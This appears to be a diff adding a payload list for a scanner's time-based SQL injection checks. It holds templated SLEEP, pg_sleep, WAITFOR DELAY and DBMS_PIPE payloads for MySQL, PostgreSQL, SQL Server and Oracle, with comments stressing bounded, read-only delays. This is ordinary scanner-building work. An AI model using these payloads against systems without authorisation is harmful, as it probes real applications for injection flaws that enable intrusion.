@@ -1,0 +1,21 @@
+# Time-based SQLi payloads (docs/DESIGN.md §7.3: "inject a bounded sleep/WAITFOR
+# and flag on a latency delta above threshold"). %B is the baseline value; %N is
+# the bounded sleep seconds the probe substitutes (small and capped - never
+# unbounded). Every payload is a pure DELAY: it sleeps, it does not write. The
+# probe re-tests to reject jitter (docs/DESIGN.md §7.3: "time-based checks
+# re-test to reduce false positives from jitter").
+
+# --- MySQL / MariaDB (SLEEP) ---
+%B' AND SLEEP(%N)-- -
+%B AND SLEEP(%N)
+%B' OR SLEEP(%N)-- -
+%B'||SLEEP(%N)||'
+
+# --- PostgreSQL (pg_sleep, non-stacked, read-only) ---
+%B' AND 1=(SELECT 1 FROM PG_SLEEP(%N))-- -
+
+# --- Microsoft SQL Server (WAITFOR DELAY - a pure wait, named in §7.3) ---
+%B';WAITFOR DELAY '0:0:%N'-- -
+
+# --- Oracle (DBMS_PIPE.RECEIVE_MESSAGE - a bounded receive timeout) ---
+%B' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',%N)-- -
